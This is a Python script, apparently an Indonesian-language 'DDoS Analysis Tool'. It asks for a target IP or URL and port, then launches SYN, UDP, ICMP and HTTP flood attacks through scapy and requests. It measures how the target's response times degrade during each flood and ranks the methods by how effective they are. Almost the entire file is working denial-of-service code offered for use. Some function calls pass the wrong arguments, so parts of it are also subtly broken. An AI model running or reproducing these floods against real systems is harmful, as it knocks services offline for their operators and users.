import time
import logging
import requests
import random
import threading
from scapy.all import IP, TCP, UDP, ICMP, send
from termcolor import colored
import matplotlib.pyplot as plt
from tabulate import tabulate
import re

# Setup logging
logging.basicConfig(filename="ddos_analysis.log", level=logging.INFO, format='%(asctime)s - %(message)s')

# Header dengan Judul dan Subheader
def display_header():
    print(colored("="*50, "cyan"))
    print(colored("DDoS Analysis Tool", "cyan", attrs=["bold"]))
    print(colored("Anonymous Fiftyseven", "cyan"))
    print(colored("="*50, "cyan"))

# Prompt untuk user input
def user_input():
    print("\nMasukkan detail serangan DDoS dalam format berikut:")
    headers = ["Parameter", "Deskripsi"]
    data = [
        ["IP/URL Target", "Alamat IP atau URL server target"],
        ["Port Target", "Port yang akan diserang (misal: 80 untuk HTTP)"],
        ["Durasi Serangan", "Durasi dalam detik untuk setiap serangan"]
    ]
    print(tabulate(data, headers, tablefmt="fancy_grid", colalign=("center",)))
    
    target_ip = input(colored("\nMasukkan IP/URL target: ", "yellow"))
    target_port = int(input(colored("Masukkan port target: ", "yellow")))
    attack_duration = int(input(colored("Masukkan durasi serangan (detik): ", "yellow")))
    
    return target_ip, target_port, attack_duration

# Method to perform SYN Flood Attack
def syn_flood(target_ip, target_port):
    ip_layer = IP(dst=target_ip)
    tcp_layer = TCP(dport=target_port, flags="S")  # SYN Flag
    packet = ip_layer / tcp_layer
    send(packet, loop=1, verbose=False)

# Method to perform UDP Flood Attack
def udp_flood(target_ip, target_port):
    ip_layer = IP(dst=target_ip)
    udp_layer = UDP(dport=target_port)
    payload = random._urandom(1024)  # Random payload
    packet = ip_layer / udp_layer / payload
    send(packet, loop=1, verbose=False)

# Method to perform ICMP Flood (Ping Flood) Attack
def icmp_flood(target_ip):
    ip_layer = IP(dst=target_ip)
    icmp_layer = ICMP()
    packet = ip_layer / icmp_layer
    send(packet, loop=1, verbose=False)

# Method to perform HTTP Flood Attack
def http_flood(url):
    while True:
        try:
            requests.get(url)
        except requests.exceptions.RequestException as e:
            logging.error(f"Error during HTTP flood: {e}")
            break

# Method to perform HTTP request to measure server response time
def measure_response(url):
    try:
        start_time = time.time()
        response = requests.get(url)
        end_time = time.time()
        response_time = end_time - start_time
        return response.status_code, response_time
    except Exception as e:
        logging.error(f"Failed to connect to {url}: {e}")
        return None, None

# Analyzing effectiveness of different DDoS methods
def analyze_ddos(url, attack_method, method_name, response_times, log_color="yellow"):
    print(colored(f"\nStarting {method_name} attack on {url}", log_color))
    
    # Baseline response time without attack
    status, baseline_time = measure_response(url)
    if status is not None:
        print(colored(f"Baseline response time: {baseline_time:.4f} seconds", "green"))
        logging.info(f"{method_name}: Baseline response time: {baseline_time:.4f} seconds")
    
    # Start DDoS attack
    attack_thread = threading.Thread(target=attack_method, args=(target_ip, target_port))
    attack_thread.daemon = True
    attack_thread.start()

    start_time = time.time()
    while time.time() - start_time < attack_duration:
        status, response_time = measure_response(url)
        if status is None:
            print(colored(f"{method_name}: Server unreachable during attack!", "red"))
            logging.error(f"{method_name}: Server unreachable during attack!")
        else:
            print(colored(f"{method_name}: Response during attack: {response_time:.4f} seconds", log_color))
            logging.info(f"{method_name}: Response time: {response_time:.4f} seconds")
            response_times.append(response_time)
        time.sleep(1)  # Wait before next measurement

    print(colored(f"{method_name} attack completed.\n", log_color))
    attack_thread.join()

# Visualize response times
def visualize_results(response_times, method_name):
    plt.plot(response_times, marker='o', label=method_name)
    plt.title(f"Server Response Time during {method_name}")
    plt.xlabel("Time (s)")
    plt.ylabel("Response Time (s)")
    plt.legend()
    plt.grid(True)
    plt.show()

# Log Analysis function
def analyze_log(log_file="ddos_analysis.log"):
    with open(log_file, 'r') as file:
        log_data = file.readlines()

    methods = {}
    current_method = ""
    unreachable_count = 0

    for line in log_data:
        if "Starting" in line:
            current_method = re.search(r"Starting (.*?) attack", line).group(1)
            if current_method not in methods:
                methods[current_method] = {"response_times": [], "unreachable": 0}

        if "Response time" in line:
            response_time = float(re.search(r"Response time: (\d+\.\d+)", line).group(1))
            methods[current_method]["response_times"].append(response_time)

        if "Server unreachable" in line:
            methods[current_method]["unreachable"] += 1

    print(colored("\n=== Analisis Efektivitas Metode DDoS ===", "cyan", attrs=["bold"]))
    
    best_method = None
    best_score = float("inf")  # Inisialisasi nilai terbaik
    for method, data in methods.items():
        avg_response = sum(data["response_times"]) / len(data["response_times"]) if data["response_times"] else float("inf")
        unreachable_rate = data["unreachable"] / len(data["response_times"]) if data["response_times"] else 0

        print(colored(f"\nMetode: {method}", "yellow"))
        print(f"Rata-rata waktu respons: {avg_response:.4f} detik")
        print(f"Jumlah server unreachable: {data['unreachable']} kali")

        # Hitung skor efektivitas berdasarkan unreachable dan response time
        score = avg_response + (unreachable_rate * 100)  # Bobot unreachable rate
        if score < best_score:
            best_method = method
            best_score = score

    print(colored(f"\nMetode paling efektif adalah: {best_method} dengan skor: {best_score:.2f}", "green"))

if __name__ == "__main__":
    display_header()

    # Prompt user for input
    target_ip, target_port, attack_duration = user_input()

    methods = [
        {"name": "SYN Flood", "method": syn_flood, "color": "yellow"},
        {"name": "UDP Flood", "method": udp_flood, "color": "blue"},
        {"name": "ICMP Flood", "method": icmp_flood, "color": "magenta"},
        {"name": "HTTP Flood", "method": http_flood, "color": "cyan"}
    ]

    for method in methods:
        response_times = []
        analyze_ddos(target_ip, method["method"], method["name"], response_times, method["color"])
        visualize_results(response_times, method["name"])

    # Analyze log for the most effective attack method
    analyze_log()
